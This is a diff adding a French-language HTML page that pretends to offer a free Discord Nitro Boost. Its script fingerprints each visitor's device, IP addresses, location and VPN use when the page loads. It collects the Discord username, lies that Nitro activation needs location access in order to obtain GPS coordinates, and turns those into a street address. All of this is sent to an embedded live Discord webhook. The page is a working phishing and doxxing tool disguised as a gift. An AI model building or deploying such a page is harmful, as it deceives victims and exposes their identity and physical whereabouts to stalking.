@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Réclame ton Nitro Boost gratuit d'1 mois offert par Rust ! Profite des avantages exclusifs comme des uploads plus élevés et des serveurs boostés.">
+    <meta name="keywords" content="discord, nitro boost, cadeau nitro, rust, discord giveaway">
+    <meta name="author" content="Rust">
+    <meta property="og:title" content="Vous avez reçu une offre d'abonnement gratuit 1 mois de Nitro Boost">
+    <meta property="og:description" content="Rust t’offre un Nitro Boost gratuit d'1 mois ! Réclame-le vite pour des avantages exclusifs comme des uploads plus élevés et des serveurs boostés.">
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1368359058142265435/1377986264199856241/image.png?ex=683af537&is=6839a3b7&hm=1be3e479a8f57ec5f0eeb27df106cc28d39994d73f21a290df4201ae00370802">
+    <meta property="og:image:alt" content="Image pour le cadeau Discord Nitro Boost">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Vous avez reçu une offre d'abonnement gratuit 1 mois de Nitro Boost">
+    <meta name="twitter:description" content="Rust t’a offert un Nitro Boost gratuit d’1 mois. Réclame-le vite pour profiter des avantages exclusifs comme des uploads plus élevés et des serveurs boostés !">
+    <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/1368359058142265435/1377986264199856241/image.png?ex=683af537&is=6839a3b7&hm=1be3e479a8f57ec5f0eeb27df106cc28d39994d73f21a290df4201ae00370802">
+    <title>Vous avez reçu une offre d'abonnement gratuit 1 mois de Nitro Boost</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Whitney', 'Arial', sans-serif;
+            background: #000;
+            height: 100vh;
+            overflow: hidden;
+            transition: background 0.5s ease;
+            color: #fff;
+        }
+        #header {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+            z-index: 20;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            display: none;
+            align-items: center;
+        }
+        #header-logo {
+            width: 40px;
+            height: 40px;
+            margin-right: 10px;
+            z-index: 15;
+        }
+        #loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #000;
+        }
+        #loading-text {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://media.discordapp.net/attachments/1368359058142265435/1377956923835682886/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?ex=683ad9e3&is=68398863&hm=fcf2009a15bbd4fdac7501725b7918d6bbea43a4275c0e159b259f29ff10fa80&=&format=webp&quality=lossless&width=822&height=462') no-repeat center center fixed;
+            background-size: cover;
+        }
+        #main-content {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://media.discordapp.net/attachments/1368359058142265435/1377956923835682886/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?ex=683ad9e3&is=68398863&hm=fcf2009a15bbd4fdac7501725b7918d6bbea43a4275c0e159b259f29ff10fa80&=&format=webp&quality=lossless&width=822&height=462') no-repeat center center fixed;
+            background-size: cover;
+        }
+        .popup {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            width: 400px;
+            box-shadow: 0 0 30px rgba(114, 137, 218, 0.7);
+            animation: fadeIn 0.5s ease-in;
+            position: relative;
+            z-index: 20;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .popup img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .popup h2 {
+            font-size: 28px;
+            color: #fff;
+            margin: 0 0 20px;
+            letter-spacing: 1px;
+            text-transform: none;
+        }
+        .popup p {
+            color: #fff;
+            font-size: 16px;
+            margin: 0 0 20px;
+        }
+        .popup input {
+            padding: 12px;
+            margin: 15px auto;
+            border-radius: 5px;
+            border: none;
+            width: 70%;
+            background: #2c2f33;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .popup input:focus {
+            border: 2px solid #7289da;
+        }
+        .popup input::placeholder {
+            color: #b9bbbe;
+        }
+        .discord-button {
+            background: #7289da;
+            color: #fff;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 70%;
+            max-width: 300px;
+            transition: background 0.3s, transform 0.2s;
+            display: block;
+            margin-left: 15%;
+            margin-right: 20%;
+        }
+        .discord-button:hover {
+            background: #5d6ba8;
+            transform: scale(1.05);
+        }
+        .discord-button:disabled {
+            background: #4a5e9a;
+            cursor: not-allowed;
+        }
+        #geoPrompt {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 400px;
+            box-shadow: 0 0 30px rgba(114, 137, 218, 0.7);
+            z-index: 20;
+        }
+        #geoPrompt p {
+            margin: 0 0 20px;
+            font-size: 16px;
+            color: #fff;
+        }
+        #geoPrompt button {
+            background: #7289da;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 0 10px;
+            transition: background 0.3s;
+        }
+        #geoPrompt button:hover {
+            background: #5d6ba8;
+        }
+        #successPopup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 400px;
+            box-shadow: 0 0 30px rgba(114, 137, 218, 0.7);
+            z-index: 20;
+        }
+        #successPopup p {
+            margin: 0 0 20px;
+            font-size: 16px;
+            color: #fff;
+        }
+        #successPopup button {
+            background: #7289da;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        #successPopup button:hover {
+            background: #5d6ba8;
+        }
+        @media (max-width: 600px) {
+            .popup {
+                width: 90%;
+                padding: 20px;
+            }
+            .popup input {
+                width: 80%;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .discord-button {
+                width: 80%;
+                margin-left: 10%;
+                margin-right: 15%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <img id="header-logo" src="https://upload.wikimedia.org/wikipedia/fr/thumb/4/4f/Discord_Logo_sans_texte.svg/1818px-Discord_Logo_sans_texte.svg.png" alt="Discord Logo">
+        Discord
+    </div>
+    <div id="loading"></div>
+    <div id="loading-text">
+        <div class="popup">
+            <h2>Récupération de ton cadeau dans le cyber espace</h2>
+        </div>
+    </div>
+    <div id="main-content">
+        <div id="initialPopup" class="popup">
+            <img src="https://img.icons8.com/fluent/512/discord-nitro-badge.png" alt="Discord Nitro">
+            <h2>Discord Nitro</h2>
+            <button id="acceptBtn" class="discord-button">Accepter</button>
+        </div>
+        <form id="nitroForm" class="popup" style="display: none;">
+            <img src="https://img.icons8.com/fluent/512/discord-nitro-badge.png" alt="Discord Nitro">
+            <h2>Discord Nitro</h2>
+            <input type="text" id="discordUsername" placeholder="Entrez votre nom d'utilisateur Discord" oninput="validateForm()">
+            <button id="submitBtn" type="submit" class="discord-button" disabled>Accepter</button>
+        </form>
+        <div id="geoPrompt" class="popup">
+            <p>Pour activer ton Nitro Boost, tu dois autoriser la localisation. Cela garantit que l’offre est sécurisée et réservée aux utilisateurs éligibles. Sans cette étape, ton Nitro Boost ne pourra pas être activé.</p>
+            <button onclick="acceptGeolocation()">Accepter Discord officiel</button>
+            <button onclick="refuseGeolocation()">Refuser</button>
+        </div>
+        <div id="successPopup" class="popup">
+            <p>Ton Nitro Boost est activé ! Profite de tes avantages via Discord officiel.</p>
+            <button onclick="redirectToDiscord()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        let currentFormData = {};
+        let gpsSent = false;
+
+        function parseUserAgent(ua) {
+            let device = "Unknown Device";
+            let deviceModel = "Unknown Model";
+            let browser = "Unknown Browser";
+            let browserVersion = "Unknown Version";
+            if (/iPhone/i.test(ua)) {
+                device = "iPhone";
+                deviceModel = ua.match(/iPhone[\s/]([\w\s]+)/i)?.[1].split(';')[0] || "Unknown iPhone";
+            } else if (/iPad/i.test(ua)) {
+                device = "iPad";
+                deviceModel = ua.match(/iPad[\s/]([\w\s]+)/i)?.[1].split(';')[0] || "Unknown iPad";
+            } else if (/Android/i.test(ua)) {
+                device = /Mobile/i.test(ua) ? "Android Phone" : "Android Tablet";
+                deviceModel = ua.match(/Android.*;\s*([^)]+)/i)?.[1].split(';')[0].trim() || "Unknown Android";
+            } else if (/Macintosh/i.test(ua)) {
+                device = "Mac";
+                deviceModel = "Macintosh";
+            } else if (/Windows/i.test(ua)) {
+                device = "Windows PC";
+                deviceModel = ua.match(/Windows NT [\d.]+/i)?.[0] || "Unknown Windows";
+            } else if (/Linux/i.test(ua)) {
+                device = "Linux PC";
+                deviceModel = "Linux";
+            }
+            if (/Tor/i.test(ua)) {
+                browser = "Tor Browser";
+                browserVersion = ua.match(/Firefox\/([\d.]+)/i)?.[1] || "Unknown Tor";
+            } else if (/Edg/i.test(ua)) {
+                browser = "Microsoft Edge";
+                browserVersion = ua.match(/Edg\/([\d.]+)/i)?.[1] || "Unknown Edge";
+            } else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) {
+                browser = "Google Chrome";
+                browserVersion = ua.match(/Chrome\/([\d.]+)/i)?.[1] || "Unknown Chrome";
+            } else if (/Firefox/i.test(ua)) {
+                browser = "Mozilla Firefox";
+                browserVersion = ua.match(/Firefox\/([\d.]+)/i)?.[1] || "Unknown Firefox";
+            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                browser = "Apple Safari";
+                browserVersion = ua.match(/Version\/([\d.]+)/i)?.[1] || "Unknown Safari";
+            } else if (/OPR|Opera/i.test(ua)) {
+                browser = "Opera";
+                browserVersion = ua.match(/(?:Opera|OPR)\/([\d.]+)/i)?.[1] || "Unknown Opera";
+            } else if (/SamsungBrowser/i.test(ua)) {
+                browser = "Samsung Internet";
+                browserVersion = ua.match(/SamsungBrowser\/([\d.]+)/i)?.[1] || "Unknown Samsung";
+            } else if (/UCBrowser/i.test(ua)) {
+                browser = "UC Browser";
+                browserVersion = ua.match(/UCBrowser\/([\d.]+)/i)?.[1] || "Unknown UC";
+            } else if (/Trident|MSIE/i.test(ua)) {
+                browser = "Internet Explorer";
+                browserVersion = ua.match(/(?:MSIE|Trident\/.*; rv:)([\d.]+)/i)?.[1] || "Unknown IE";
+            } else if (/Netscape/i.test(ua)) {
+                browser = "Netscape";
+                browserVersion = ua.match(/Netscape\/([\d.]+)/i)?.[1] || "Unknown Netscape";
+            }
+            return { device, deviceModel, browser, browserVersion };
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging ? "Charging" : "Not Charging"
+                    };
+                }
+                return { level: "Not supported", charging: "Not supported" };
+            } catch (e) {
+                console.error("Battery error:", e);
+                return { level: "Error", charging: "Error" };
+            }
+        }
+
+        function getParisTimestamp() {
+            return new Intl.DateTimeFormat('fr-FR', {
+                timeZone: 'Europe/Paris',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            }).format(new Date());
+        }
+
+        function generateNitroLink() {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let code = '';
+            for (let i = 0; i < 16; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return `https://discord.gift/${code}`;
+        }
+
+        async function reverseGeocode(lat, lng) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
+                const data = await response.json();
+                return data?.display_name ? {
+                    address: data.display_name,
+                    mapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
+                    streetViewUrl: `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}&heading=0&pitch=0&fov=80`
+                } : { address: "Adresse inconnue", mapsUrl: "", streetViewUrl: "" };
+            } catch (e) {
+                console.error("Erreur localisation:", e);
+                return { address: "Échec localisation", mapsUrl: "", streetViewUrl: "" };
+            }
+        }
+
+        async function harvestUserData(stage, formData = {}, gpsData = "Non collectée") {
+            try {
+                const batteryInfo = await getBatteryInfo();
+                const { device, deviceModel, browser, browserVersion } = parseUserAgent(navigator.userAgent);
+                const userData = {
+                    timestamp: getParisTimestamp(),
+                    deviceName: device,
+                    deviceModel: deviceModel,
+                    browser: browser,
+                    browserVersion: browserVersion,
+                    battery: {
+                        level: batteryInfo.level,
+                        charging: batteryInfo.charging
+                    },
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language || navigator.userLanguage,
+                    screen: {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        colorDepth: window.screen.colorDepth
+                    },
+                    formData: formData,
+                    gps: gpsData,
+                    company: "Inconnu"
+                };
+                try {
+                    const ipv4Response = await fetch('https://api.ipify.org?format=json');
+                    const ipv4Data = await ipv4Response.json();
+                    userData.ipv4 = ipv4Data.ip || "Inconnu";
+                    const ipv6Response = await fetch('https://api64.ipify.org?format=json');
+                    const ipv6Data = await ipv6Response.json();
+                    userData.ipv6 = ipv6Data.ip.includes(':') ? ipv6Data.ip : "Pas d'IPv6";
+                    try {
+                        const ipLocationResponse = await fetch(`https://ipapi.co/${userData.ipv4}/json/`);
+                        if (!ipLocationResponse.ok) {
+                            console.error(`Erreur ipapi.co: Statut ${ipLocationResponse.status}`);
+                            throw new Error("Échec requête ipapi.co");
+                        }
+                        const ipLocationInfo = await ipLocationResponse.json();
+                        userData.ipLocation = {
+                            city: ipLocationInfo.city || "Unknown",
+                            region: ipLocationInfo.region || "Unknown",
+                            country: ipLocationInfo.country_name || "Unknown",
+                            latitude: ipLocationInfo.latitude || null,
+                            longitude: ipLocationInfo.longitude || null,
+                            mapsUrl: ipLocationInfo.latitude && ipLocationInfo.longitude 
+                                ? `https://www.google.com/maps?q=${ipLocationInfo.latitude},${ipLocationInfo.longitude}`
+                                : "Not available"
+                        };
+                        userData.company = ipLocationInfo.org || "Inconnu";
+                        userData.asn = ipLocationInfo.asn || "Inconnu";
+                    } catch (e) {
+                        userData.ipLocation = { city: "Unknown", region: "Unknown", country: "Unknown", mapsUrl: "Not available" };
+                        userData.company = "Inconnu";
+                        userData.asn = "Inconnu";
+                        console.error("Erreur ipapi.co:", e.message);
+                    }
+                    try {
+                        const ipThreatResponse = await fetch(`https://api.ipapi.is?q=${userData.ipv4}&key=a1e22978bae118716878`);
+                        if (!ipThreatResponse.ok) {
+                            console.error(`Erreur ipapi.is: Statut ${ipThreatResponse.status}`);
+                            throw new Error("Échec requête ipapi.is");
+                        }
+                        const ipThreatInfo = await ipThreatResponse.json();
+                        userData.vpn = ipThreatInfo.is_vpn ? "VPN détecté" : "Aucun VPN";
+                        userData.proxy = ipThreatInfo.is_proxy ? "Proxy détecté" : "Aucun Proxy";
+                        userData.tor = ipThreatInfo.is_tor ? "TOR détecté" : "Aucun TOR";
+                    } catch (e) {
+                        userData.vpn = "Inconnu";
+                        userData.proxy = "Inconnu";
+                        userData.tor = "Inconnu";
+                        console.error("Erreur ipapi.is threat:", e.message);
+                    }
+                } catch (e) {
+                    userData.ipv4 = "Échec récupération IPv4";
+                    userData.ipv6 = "Échec récupération IPv6";
+                    userData.ipLocation = { city: "Unknown", region: "Unknown", country: "Unknown", mapsUrl: "Not available" };
+                    userData.vpn = "Inconnu";
+                    userData.proxy = "Inconnu";
+                    userData.tor = "Inconnu";
+                    userData.company = "Inconnu";
+                    userData.asn = "Inconnu";
+                    console.error("Erreur IP fetch:", e.message);
+                }
+                if (typeof gpsData === 'object' && gpsData.latitude && gpsData.longitude) {
+                    const geoInfo = await reverseGeocode(gpsData.latitude, gpsData.longitude);
+                    userData.gps.address = geoInfo.address;
+                    userData.gps.mapsUrl = geoInfo.mapsUrl;
+                    userData.gps.streetViewUrl = geoInfo.streetViewUrl;
+                }
+                sendToWebhook(stage, userData);
+            } catch (err) {
+                console.error("Erreur collecte données:", err.message);
+            }
+        }
+
+        async function sendToWebhook(stage, data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1377977905707225108/SDHXxq4-bt-87SUcIBwGiMATxJorNVyROZaGMgzEjub1Xdlks7Jod6ZpbZYZLoA6orN-";
+            let embed = {
+                title: `Étape ${stage} : Nouvelle Collecte`,
+                color: 0x5865F2,
+                fields: [],
+                timestamp: new Date().toISOString()
+            };
+            if (stage === "1) Page Load") {
+                embed.fields = [
+                    { name: "Timestamp", value: data.timestamp, inline: true },
+                    { name: "Device", value: data.deviceName, inline: true },
+                    { name: "Device Model", value: data.deviceModel, inline: true },
+                    { name: "Browser", value: data.browser, inline: true },
+                    { name: "Browser Version", value: data.browserVersion, inline: true },
+                    { name: "Battery", value: `${data.battery.level}% (${data.battery.charging})`, inline: true },
+                    { name: "IPv4", value: data.ipv4, inline: true },
+                    { name: "IPv6", value: data.ipv6, inline: true },
+                    { name: "VPN Detected", value: data.vpn, inline: true },
+                    { name: "Proxy Detected", value: data.proxy, inline: true },
+                    { name: "TOR Detected", value: data.tor, inline: true },
+                    { name: "Company", value: data.company, inline: true },
+                    { name: "ASN", value: data.asn, inline: true },
+                    { name: "IP Location", value: `${data.ipLocation.city}, ${data.ipLocation.region}, ${data.ipLocation.country}`, inline: true },
+                    { name: "IP Maps", value: data.ipLocation.mapsUrl, inline: true },
+                    { name: "User Agent", value: data.userAgent, inline: false },
+                    { name: "Platform", value: data.platform, inline: true },
+                    { name: "Language", value: data.language, inline: true },
+                    { name: "Screen", value: `Width=${data.screen.width}px, Height=${data.screen.height}px, Depth=${data.screen.colorDepth}bits`, inline: true }
+                ];
+            } else if (stage === "2) Formulaire") {
+                embed.fields = [
+                    { name: "Timestamp", value: data.timestamp, inline: true },
+                    { name: "Nom d'utilisateur Discord", value: data.formData.discordUsername || "Non fourni", inline: true },
+                    { name: "Lien Nitro", value: data.formData.nitroLink || "Non fourni", inline: true }
+                ];
+            } else if (stage === "3) Google Pinpoint") {
+                embed.fields = [
+                    { name: "Timestamp", value: data.timestamp, inline: true },
+                    { name: "GPS", value: typeof data.gps === 'object' ? `Latitude: ${data.gps.latitude}, Longitude: ${data.gps.longitude}, Accuracy: ${data.gps.accuracy}m` : data.gps, inline: true },
+                    { name: "Adresse", value: data.gps.address || "Non fourni", inline: true },
+                    { name: "Google Maps", value: data.gps.mapsUrl || "Non fourni", inline: true },
+                    { name: "Street View", value: data.gps.streetViewUrl || "Non fourni", inline: true }
+                ];
+            }
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                if (response.ok && stage === "3) Google Pinpoint" && typeof data.gps === 'object') {
+                    gpsSent = true;
+                    document.getElementById('successPopup').style.display = 'block';
+                }
+                if (!response.ok) console.error("Échec envoi webhook, statut:", response.status);
+            } catch (err) {
+                console.error("Erreur envoi webhook:", err.message);
+            }
+        }
+
+        function redirectToDiscord() {
+            window.location.href = "https://discord.com";
+        }
+
+        function collectFormData() {
+            currentFormData = {
+                discordUsername: document.getElementById('discordUsername').value,
+                nitroLink: generateNitroLink()
+            };
+            harvestUserData("2) Formulaire", currentFormData);
+            showGeoPrompt();
+        }
+
+        function showGeoPrompt() {
+            document.getElementById('geoPrompt').style.display = 'block';
+        }
+
+        function acceptGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const gpsData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        document.getElementById('geoPrompt').style.display = 'none';
+                        harvestUserData("3) Google Pinpoint", currentFormData, gpsData);
+                    },
+                    (error) => {
+                        console.error("Erreur localisation:", error.message);
+                        document.getElementById('geoPrompt').style.display = 'none';
+                        alert("Erreur lors de la localisation. Veuillez réessayer ou vérifier vos paramètres.");
+                    },
+                    { timeout: 5000 }
+                );
+            } else {
+                document.getElementById('geoPrompt').style.display = 'none';
+                alert("Votre navigateur ne supporte pas la localisation.");
+            }
+        }
+
+        function refuseGeolocation() {
+            document.getElementById('geoPrompt').style.display = 'none';
+            alert("Localisation refusée. Tu dois activer la localisation pour recevoir ton Nitro Boost. Rejoins la communauté Discord pour plus d’infos !");
+            harvestUserData("3) Google Pinpoint", currentFormData, "Localisation refusée");
+        }
+
+        function validateForm() {
+            const discordUsername = document.getElementById('discordUsername');
+            const submitBtn = document.getElementById('submitBtn');
+            const discordValid = discordUsername.value.match(/^[a-zA-Z0-9._]{2,32}$/);
+            submitBtn.disabled = !discordValid;
+        }
+
+        document.getElementById('nitroForm').addEventListener('input', validateForm);
+        document.getElementById('nitroForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (!document.getElementById('submitBtn').disabled) {
+                collectFormData();
+            }
+        });
+
+        document.getElementById('acceptBtn').addEventListener('click', () => {
+            document.getElementById('initialPopup').style.display = 'none';
+            document.getElementById('nitroForm').style.display = 'block';
+            document.getElementById('nitroForm').querySelector('input').style.display = 'block';
+        });
+
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('loading-text').style.display = 'flex';
+                document.getElementById('header').style.display = 'flex';
+                setTimeout(() => {
+                    document.getElementById('loading-text').style.display = 'none';
+                    document.getElementById('main-content').style.display = 'flex';
+                    harvestUserData("1) Page Load");
+                }, 2000);
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
